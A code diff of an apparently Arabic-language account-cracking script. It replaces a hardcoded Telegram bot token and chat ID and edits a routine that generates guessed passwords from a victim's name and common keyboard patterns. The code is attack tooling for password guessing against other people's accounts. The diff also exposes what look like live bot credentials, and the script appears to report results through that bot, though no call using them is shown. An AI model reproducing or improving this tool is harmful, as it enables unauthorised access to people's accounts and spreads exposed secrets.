@@ -8,7 +8,6 @@ libraries = [
 for lib in libraries:
     subprocess.check_call(["pip", "install", lib])
 
-print("تم تثبيت جميع المكتبات بنجاح!")
 r9 = '\x1b[1;38;5;141m'
 r7 = '\x1b[1;38;5;131m'
 a1 = '\x1b[1;31m'  # أحمر
@@ -51,8 +50,8 @@ a37 = '\x1b[38;5;172m'  # ذهبي داكن
 a38 = '\x1b[38;5;188m'  # فضي فاتح
 a39 = '\x1b[38;5;247m'  # فضي داكن
 a40 = '\x1b[1;94m'  # أزرق سماوي
-TBO ='5892525344:AAGer5nA5rengxKmIY9F9nnjmsEZr89dfFc'
-ID9 = 5133630165
+TBO ='6982780866:AAGIZ0k4pxNdstwjZn_dFovWinXEg4Td1K4'
+ID9 = 647776789
 import sys,time,os
 class TBOA1:
     def __init__(self,z):
@@ -560,20 +559,21 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
-					d("aassddff")
+					pwv.append(nmf)
+					pwv.append("112233445566")
 					pwv.append(frs+"123")
-					pwv.append(frs+'2008')
+					pwv.append(frs+'2000')
 					pwv.append('1234@@@@')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
-					pwv.append('1234554321')
-					pwv.append('qqwweerr')
+					pwv.append('1234512345')
+					pwv.append('qqwweerrttyy')
 					pwv.append('ppooiiuu')
 					pwv.append('1122334455')
 					pwv.append('11223344@@')
 					pwv.append('mmnnbbvvccxxzz')
-					pwv.append('zxcvzxcv')
+					pwv.append('aassddffgghhjjkkll')
 				else:
 					pwv.append(nmf)
 					pwv.append('20202020')
